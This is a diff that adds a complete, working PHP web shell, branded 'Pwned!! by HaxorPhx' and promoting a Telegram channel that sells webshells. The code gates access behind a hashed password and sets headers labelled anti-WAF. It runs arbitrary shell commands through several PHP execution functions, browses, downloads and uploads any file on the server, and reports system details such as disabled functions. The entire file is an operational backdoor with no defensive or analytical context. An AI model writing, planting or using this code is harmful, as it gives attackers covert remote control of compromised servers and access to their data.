@@ -1,0 +1,444 @@
+<?php
+/**
+ * Shell Access - Open Source
+ */
+
+// ========== ANTI-WAF & ANTI-LITESPEED ==========
+header('X-Accel-Buffering: no');
+header('X-Accel-Expires: 0');
+header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
+header('Cache-Control: post-check=0, pre-check=0', false);
+header('Pragma: no-cache');
+header('Expires: Mon, 26 Jul 1997 05:00:00 GMT');
+
+if (function_exists('apache_setenv')) {
+    @apache_setenv('no-gzip', 1);
+}
+@ini_set('zlib.output_compression', 0);
+@ini_set('output_buffering', 0);
+
+// ========== AUTENTIKASI DENGAN SHA256 ==========
+session_start();
+
+$password_hash = '22a6246f35320bae9db00443fec25133a154dc144f603a7589e5809540c3ac05';
+
+if (!isset($_SESSION['shell_auth']) || $_SESSION['shell_auth'] !== true) {
+    if (isset($_POST['pass']) && hash('sha256', $_POST['pass']) === $password_hash) {
+        $_SESSION['shell_auth'] = true;
+    } else {
+        echo '<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>Pwned!! by HaxorPhx</title>
+            <meta property="og:title" content="Pwned!! by HaxorPhx">
+            <meta property="og:description" content="OWNER CHANNEL: https://t.me/biskuat15 | BE A SMART BUYER | @DAFTARWEBSHELL">
+            <meta property="og:image" content="https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/Daftar_Webshell.jpg">
+            <meta property="og:url" content="https://t.me/biskuat15">
+            <meta property="og:type" content="website">
+            <meta name="twitter:card" content="summary_large_image">
+            <style>
+                body { 
+                    margin: 0; 
+                    padding: 0; 
+                    background: #0a0a14; 
+                    display: flex; 
+                    justify-content: center; 
+                    align-items: center; 
+                    min-height: 100vh;
+                    font-family: monospace;
+                }
+                .login-box {
+                    background: #1e1e2a;
+                    padding: 35px 40px;
+                    border-radius: 16px;
+                    border: 1px solid #3a6a6a;
+                    text-align: center;
+                    box-shadow: 0 0 25px rgba(0,200,0,0.1);
+                }
+                .login-image {
+                    max-width: 280px;
+                    height: auto;
+                    border-radius: 8px;
+                    margin-bottom: 25px;
+                    display: block;
+                    margin-left: auto;
+                    margin-right: auto;
+                }
+                input {
+                    background: #0a0a14;
+                    border: 1px solid #3a6a6a;
+                    color: #0f0;
+                    padding: 12px 20px;
+                    width: 260px;
+                    font-family: monospace;
+                    border-radius: 8px;
+                    font-size: 14px;
+                    text-align: center;
+                    margin-top: 10px;
+                }
+                input:focus {
+                    outline: none;
+                    border-color: #0f0;
+                    box-shadow: 0 0 8px #0f0;
+                }
+                button {
+                    background: #2a6a6a;
+                    color: #0f0;
+                    border: none;
+                    padding: 12px 30px;
+                    margin-top: 20px;
+                    cursor: pointer;
+                    border-radius: 8px;
+                    font-family: monospace;
+                    font-size: 14px;
+                    font-weight: bold;
+                    width: 100%;
+                    transition: all 0.2s;
+                }
+                button:hover {
+                    background: #3a8a8a;
+                    transform: scale(1.02);
+                }
+            </style>
+        </head>
+        <body>
+        <div class="login-box">
+            <img src="https://raw.githubusercontent.com/haxorleviathan-glitch/repository/refs/heads/main/Daftar_Webshell.jpg" class="login-image" alt="Webshell">
+            <form method="post">
+                <input type="password" name="pass" placeholder="Enter password" autofocus>
+                <br><button type="submit">LOGIN</button>
+            </form>
+        </div>
+        </body>
+        </html>';
+        exit;
+    }
+}
+
+// ========== FUNGSI EKSEKUSI COMMAND ==========
+function run_command($cmd) {
+    $output = '';
+    
+    if (function_exists('proc_open')) {
+        $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
+        $process = proc_open($cmd, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            fclose($pipes[0]);
+            $output = stream_get_contents($pipes[1]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+        }
+    }
+    elseif (function_exists('popen')) {
+        $handle = popen($cmd, 'r');
+        if ($handle) {
+            while (!feof($handle)) $output .= fread($handle, 1024);
+            pclose($handle);
+        }
+    }
+    elseif (function_exists('shell_exec')) {
+        $output = @shell_exec($cmd);
+    }
+    elseif (function_exists('system')) {
+        ob_start();
+        @system($cmd);
+        $output = ob_get_clean();
+    }
+    elseif (function_exists('exec')) {
+        @exec($cmd, $out);
+        $output = implode("\n", $out);
+    }
+    else {
+        $output = @`$cmd`;
+    }
+    
+    return $output !== false && $output !== null ? $output : '[!] No output';
+}
+
+// ========== PROSES COMMAND ==========
+$result = '';
+$last_cmd = '';
+
+if (isset($_POST['cmd'])) {
+    $last_cmd = $_POST['cmd'];
+    $result = run_command($last_cmd);
+}
+
+// ========== CEK AKSI ==========
+$action = isset($_GET['action']) ? $_GET['action'] : 'main';
+
+if ($action === 'terminal') {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Pwned!! by HaxorPhx</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body { background: #0a0a14; font-family: 'Courier New', monospace; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+            .top { background: #1a1a2a; padding: 12px 20px; border-bottom: 1px solid #3a6a6a; display: flex; justify-content: space-between; }
+            .top h1 a { color: #0f0; font-size: 14px; text-decoration: none; }
+            .top .path { color: #8aca8a; font-size: 12px; }
+            .info-bar { background: #0a1a1a; padding: 6px 15px; font-size: 10px; color: #5a8a8a; border-bottom: 1px solid #1a3a3a; }
+            .screen { flex: 1; overflow-y: auto; padding: 15px; background: #0a0a14; }
+            .line { color: #0f0; margin-bottom: 3px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+            .input-bar { display: flex; padding: 12px 15px; background: #1a1a2a; border-top: 1px solid #3a6a6a; }
+            .prompt { color: #0f0; font-weight: bold; margin-right: 12px; }
+            .cmd-field { flex: 1; background: transparent; border: none; color: #0f0; font-family: monospace; font-size: 12px; outline: none; }
+            .btn { background: #2a6a6a; color: #0f0; border: none; padding: 6px 20px; margin-left: 10px; cursor: pointer; border-radius: 4px; }
+            .btn:hover { background: #3a8a8a; }
+        </style>
+    </head>
+    <body>
+        <div class="top">
+            <h1><a href="https://t.me/biskuat15" target="_blank">🐚 SHELL BISKUAT15</a></h1>
+            <div class="path"><?php echo getcwd(); ?></div>
+        </div>
+        <div class="info-bar">⚡ Anti-WAF Active | Anti-Cache Enabled</div>
+        <div class="screen" id="screen">
+            <div class="line">═══════════════════════════════════════</div>
+            <div class="line">  🔥 SHELL ACTIVE 🔥</div>
+            <div class="line">═══════════════════════════════════════</div>
+            <div class="line"></div>
+            <?php if ($last_cmd): ?>
+            <div class="line">$> <?php echo htmlspecialchars($last_cmd); ?></div>
+            <div class="line"><?php echo nl2br(htmlspecialchars($result)); ?></div>
+            <div class="line"></div>
+            <?php endif; ?>
+        </div>
+        <form method="post" class="input-bar" style="margin:0; display:flex;">
+            <span class="prompt">$></span>
+            <input type="text" name="cmd" class="cmd-field" autofocus value="<?php echo htmlspecialchars($last_cmd); ?>">
+            <button type="submit" class="btn">RUN</button>
+        </form>
+        <script>
+            document.getElementById('screen').scrollTop = document.getElementById('screen').scrollHeight;
+            document.querySelector('.cmd-field').focus();
+        </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+if ($action === 'files') {
+    $path = isset($_GET['path']) ? $_GET['path'] : getcwd();
+    $path = realpath($path);
+    if (!$path || !is_dir($path)) $path = getcwd();
+    
+    $items = scandir($path);
+    $folders = [];
+    $files = [];
+    
+    foreach ($items as $item) {
+        if ($item == '.' || $item == '..') continue;
+        if (is_dir($path . '/' . $item)) {
+            $folders[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+    sort($folders);
+    sort($files);
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Pwned!! by HaxorPhx</title>
+        <style>
+            body { background: #0a0a14; font-family: monospace; margin: 0; padding: 20px; }
+            .container { max-width: 1400px; margin: 0 auto; }
+            .nav { background: #1a1a2a; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+            .nav a { color: #0f0; text-decoration: none; margin-right: 20px; padding: 5px 10px; border-radius: 5px; }
+            .nav a:hover { background: #2a6a6a; }
+            .nav .location { color: #8aca8a; background: #0a0a14; padding: 6px 12px; border-radius: 6px; font-size: 12px; }
+            table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+            th { text-align: left; padding: 12px 15px; background: #1a1a2a; color: #8aca8a; border-bottom: 2px solid #3a6a6a; }
+            td { padding: 10px 15px; border-bottom: 1px solid #2a3a3a; color: #0f0; }
+            tr:hover { background: #1a1a2a; }
+            .dir-link { color: #8aca8a; text-decoration: none; font-weight: bold; }
+            .file-link { color: #0f0; text-decoration: none; }
+            .size-col { text-align: right; }
+            .section-title { margin: 20px 0 10px; padding: 8px 15px; background: #1a1a2a; border-radius: 8px; color: #8aca8a; display: inline-block; }
+            .upload-area { margin-top: 25px; padding: 20px; background: #1a1a2a; border-radius: 10px; display: flex; gap: 15px; align-items: center; }
+            .upload-area input[type="file"] { background: #0a0a14; color: #0f0; border: 1px solid #3a6a6a; padding: 8px 12px; border-radius: 6px; }
+            .upload-area button { background: #2a6a6a; color: #0f0; border: none; padding: 8px 20px; cursor: pointer; border-radius: 6px; }
+            .separator { height: 2px; background: #2a3a3a; margin: 15px 0; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="nav">
+                <div>
+                    <a href="?action=terminal">← TERMINAL</a>
+                    <a href="?action=files&path=<?php echo urlencode(dirname($path)); ?>">⬆ UP</a>
+                    <a href="?action=files&path=<?php echo urlencode(getcwd()); ?>">🏠 HOME</a>
+                </div>
+                <div class="location">📍 <?php echo htmlspecialchars($path); ?></div>
+            </div>
+            
+            <?php if (!empty($folders)): ?>
+            <div class="section-title">📁 FOLDERS (<?php echo count($folders); ?>)</div>
+            <table>
+                <thead> <tr><th>NAME</th><th style="width:100px">SIZE</th><th style="width:80px">PERM</th> </tr> </thead>
+                <tbody>
+                <?php foreach ($folders as $folder): 
+                    $fullpath = $path . '/' . $folder;
+                    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
+                ?>
+                <tr>
+                    <td><a href="?action=files&path=<?php echo urlencode($fullpath); ?>" class="dir-link">📁 <?php echo htmlspecialchars($folder); ?></a></td>
+                    <td class="size-col">-</td>
+                    <td><?php echo $perm; ?></td>
+                </tr>
+                <?php endforeach; ?>
+                </tbody>
+            </table>
+            <?php endif; ?>
+            
+            <?php if (!empty($files)): ?>
+            <div class="section-title">📄 FILES (<?php echo count($files); ?>)</div>
+            <table>
+                <thead> <tr><th>NAME</th><th style="width:100px">SIZE</th><th style="width:80px">PERM</th><th style="width:80px">ACTION</th> </tr> </thead>
+                <tbody>
+                <?php foreach ($files as $file): 
+                    $fullpath = $path . '/' . $file;
+                    $size = filesize($fullpath);
+                    $size_display = $size < 1024 ? $size . ' B' : ($size < 1048576 ? round($size/1024,1).' KB' : round($size/1048576,1).' MB');
+                    $perm = substr(sprintf('%o', fileperms($fullpath)), -4);
+                ?>
+                <tr>
+                    <td><a href="?action=download&file=<?php echo urlencode($fullpath); ?>" class="file-link">📄 <?php echo htmlspecialchars($file); ?></a></td>
+                    <td class="size-col"><?php echo $size_display; ?></td>
+                    <td><?php echo $perm; ?></td>
+                    <td><a href="?action=download&file=<?php echo urlencode($fullpath); ?>" style="color:#2a8a8a;">⬇ DL</a></td>
+                </tr>
+                <?php endforeach; ?>
+                </tbody>
+            </table>
+            <?php endif; ?>
+            
+            <div class="separator"></div>
+            <div class="upload-area">
+                <form method="post" enctype="multipart/form-data" action="?action=upload" style="display:flex; gap:15px;">
+                    <input type="hidden" name="path" value="<?php echo htmlspecialchars($path); ?>">
+                    <input type="file" name="file">
+                    <button type="submit">📤 UPLOAD</button>
+                </form>
+            </div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+if ($action === 'upload' && isset($_FILES['file'])) {
+    $target = isset($_POST['path']) ? $_POST['path'] : getcwd();
+    $target = rtrim($target, '/') . '/' . $_FILES['file']['name'];
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+        echo "<script>alert('Upload OK'); location.href='?action=files&path=" . urlencode(dirname($target)) . "';</script>";
+    } else {
+        echo "<script>alert('Upload Failed'); history.back();</script>";
+    }
+    exit;
+}
+
+if ($action === 'download' && isset($_GET['file'])) {
+    $file = $_GET['file'];
+    if (file_exists($file) && is_file($file)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        readfile($file);
+    }
+    exit;
+}
+
+if ($action === 'info') {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head><title>Pwned!! by HaxorPhx</title>
+    <style>body{background:#0a0a14;font-family:monospace;padding:25px;} .box{background:#1a1a2a;padding:25px;border-radius:12px;}</style>
+    </head>
+    <body>
+    <div class="box">
+    <a href="?action=terminal" style="color:#0f0;">← Back</a>
+    <pre style="color:#0f0;">
+<?php
+echo str_repeat("=", 60) . "\n";
+echo "  SYSTEM INFORMATION\n";
+echo str_repeat("=", 60) . "\n";
+echo "PHP Version      : " . phpversion() . "\n";
+echo "Server           : " . ($_SERVER['SERVER_SOFTWARE'] ?? 'N/A') . "\n";
+echo "Current User     : " . (function_exists('get_current_user') ? get_current_user() : 'N/A') . "\n";
+echo "Current CWD      : " . getcwd() . "\n";
+echo "Document Root    : " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n";
+echo "OS               : " . PHP_OS . "\n";
+echo "Disabled Func    : " . (ini_get('disable_functions') ?: 'None') . "\n";
+echo "Server IP        : " . ($_SERVER['SERVER_ADDR'] ?? 'N/A') . "\n";
+echo "Client IP        : " . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "\n";
+echo str_repeat("=", 60) . "\n";
+echo "  STATUS: ACTIVE\n";
+echo str_repeat("=", 60) . "\n";
+?>
+    </pre>
+    </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ========== TAMPILAN UTAMA ==========
+$cwd = getcwd();
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Pwned!! by HaxorPhx</title>
+    <style>
+        body { background: #0a0a14; font-family: monospace; margin: 0; padding: 20px; }
+        .container { max-width: 1300px; margin: 0 auto; }
+        .header { background: #1a1a2a; padding: 18px 22px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #3a6a6a; }
+        .header h1 a { color: #0f0; font-size: 18px; text-decoration: none; }
+        .header .info { color: #8aca8a; margin-top: 8px; font-size: 11px; }
+        .menu { display: flex; gap: 12px; margin-bottom: 20px; }
+        .menu a { background: #1a1a2a; color: #0f0; padding: 10px 20px; text-decoration: none; border-radius: 8px; border: 1px solid #3a6a6a; }
+        .menu a:hover { background: #2a6a6a; }
+        .card { background: #1a1a2a; border-radius: 12px; padding: 22px; border: 1px solid #3a6a6a; }
+        .cmd-area { display: flex; gap: 12px; }
+        .cmd-input { flex: 1; background: #0a0a14; border: 1px solid #3a6a6a; color: #0f0; padding: 12px; font-family: monospace; border-radius: 8px; font-size: 13px; }
+        .btn { background: #2a6a6a; color: #0f0; border: none; padding: 12px 28px; border-radius: 8px; cursor: pointer; font-family: monospace; font-size: 13px; }
+        .btn:hover { background: #3a8a8a; }
+        .output { background: #0a0a14; border: 1px solid #3a6a6a; border-radius: 8px; padding: 18px; margin-top: 18px; color: #0f0; white-space: pre-wrap; overflow: auto; max-height: 450px; font-size: 12px; }
+        .status { color: #5a8a8a; font-size: 10px; margin-top: 12px; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1><a href="https://t.me/biskuat15" target="_blank">🐚 SHELL BISKUAT15</a></h1>
+        <div class="info">CWD: <?php echo htmlspecialchars($cwd); ?> | User: <?php echo function_exists('get_current_user') ? get_current_user() : 'n/a'; ?> | OS: <?php echo PHP_OS; ?></div>
+    </div>
+    
+    <div class="menu">
+        <a href="?action=terminal">🎯 TERMINAL</a>
+        <a href="?action=files">📁 FILE MANAGER</a>
+        <a href="?action=info">ℹ️ SYSTEM INFO</a>
+    </div>
+    
+    <div class="card">
+        <h3 style="color:#0f0; margin-bottom:16px;">▶ COMMAND EXECUTOR</h3>
+        <form method="post" class="cmd-area" style="display:flex; gap:12px;">
+            <input type="text" name="cmd" class="cmd-input" placeholder="Enter command..." value="<?php echo htmlspecialchars($last_cmd); ?>" autofocus>
+            <button type="submit" class="btn">EXECUTE</button>
+        </form>
+        <div class="output">$> <?php echo $last_cmd ? htmlspecialchars($last_cmd) : 'Ready...'; ?><br><br><?php echo nl2br(htmlspecialchars($result)); ?></div>
+        <div class="status">⚡ Anti-WAF Active | Anti-Cache Enabled | Session: <?php echo session_id(); ?></div>
+    </div>
+</div>
+</body>
+</html>
